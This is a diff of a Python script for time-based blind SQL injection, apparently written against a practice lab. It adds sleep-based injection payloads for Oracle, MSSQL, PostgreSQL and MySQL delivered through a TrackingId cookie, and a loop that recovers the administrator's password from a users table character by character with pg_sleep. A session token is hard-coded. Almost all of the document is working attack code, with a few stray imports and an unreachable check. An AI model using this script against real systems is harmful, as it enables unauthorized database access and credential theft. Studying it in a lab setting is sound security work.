@@ -19,16 +19,20 @@
 '''
 
 
+from pickle import FALSE, TRUE
+from turtle import position
 import requests
 import sys
 import argparse
 import urllib.parse as up
+import string
+
 
 def getArguments():
     if len(sys.argv) > 1:
         URL = sys.argv[1]
     else:
-        print("Usage: python3 tbSQLi.py URL [...]") 
+        print("Usage: python3 time_based_SQLi.py URL [...]") 
 
     return URL
 
@@ -62,12 +66,51 @@ def sendRequest(URL, inCookies):
     #counts time between request an response
     elapsed = res.elapsed.total_seconds()
 
-
-    print("Code: ", status)
-    print(elapsed)
-
     return elapsed 
     
+def findEntry(inTrigger, URL, sessID):
+    payloads={
+        "ORACLE":"'; SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),2) ELSE NULL END FROM dual--",
+        "Microsoft":"'; IF (1=1) WAITFOR DELAY '0:0:2'--",
+        "PostgreSQL":"'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--",
+        "MySQL":"'; SELECT IF (1=1),SLEEP(2),'a')--"
+    }
+
+    for key in payloads:
+        cookies = dict(TrackingId = up.quote(payloads[key]), session = sessID)
+        timeElpased = sendRequest(URL, cookies)
+
+        if timeElpased >= inTrigger:
+            print("[+] Time based SQLi possible")
+            print("Payload for SQLi: ", payloads[key])
+
+        
+def fuzzPass(inTrigger, URL, sessID):
+
+    symbols=list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
+  
+    for letter_pos in range(1,21,1):
+        for i in range(len(symbols)):
+            payload = "'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,"
+            payload += str(letter_pos) 
+            payload += ",1)='" + symbols[i] + "') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--"
+
+           #print("sending...")
+            #print(payload)
+
+            cookies = dict(TrackingId = up.quote(payload), session = sessID)
+            timeElpased = sendRequest(URL, cookies)
+
+            if timeElpased >= inTrigger:
+                print("[+] Password letter found")
+                print("Position: " + str(letter_pos) + " and Value= " + symbols[i])
+                break
+
+            if i == len(symbols):
+                print("No more matching characters. Exiting")
+                return
+
+
 
 #################################### Main ##############################
 
@@ -75,8 +118,6 @@ def main():
 
     parser = argparse.ArgumentParser()
     
-    parser.add_argument('-t', '--TrackingId', default="", type=str, help="TrackingId cookie")
-    parser.add_argument('-s', '--session', default="", type=str, help="Session cookie")
     parser.add_argument('URL', type=str, help='target URL')
 
 
@@ -84,26 +125,34 @@ def main():
     args = parser.parse_args()
 
     targetURL = args.URL
-    #strip whitespace and convert unsafe characters to URL
-    trID = up.quote(args.TrackingId.strip())
-    sessID = up.quote(args.session.strip())
+
+    #from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based
+    #payload="x'; SELECT 1 FROM PG_SLEEP(2) --"
+
+    #payload="'; SELECT CASE WHEN 1=1 THEN pg_sleep(2) ELSE pg_sleep(0) END --"
 
 
-    try:
-        cookies = dict(TrackingId = trID, session = sessID)
-    except:
-        print("Cant build cookie. Something is wrong.")
-    
+
+    #trID=up.quote(payload)
+    sessID=up.quote("Ct7jARyZq3bkSwHb6z5z3khEyu6w6HB9")
+
+
     # trigger in seconds
-    inTrigger = 10
+    inTrigger = 1
 
-    timeElpased = sendRequest(targetURL, cookies)
+    #findEntry(inTrigger, targetURL, sessID)
 
-    if timeElpased >= inTrigger:
-        print("TRUE")
-    else:
-        print("FALSE")
+    fuzzPass(inTrigger, targetURL, sessID)
 
+'''
+    while 1:
+        timeElpased = sendRequest(targetURL, cookies)
+
+        if timeElpased >= inTrigger:
+            print("Time to response is high -> time based SQLi possible")
+        else:
+            print("Time delay not triggered")
+'''
 
 if __name__ == "__main__":
     main()
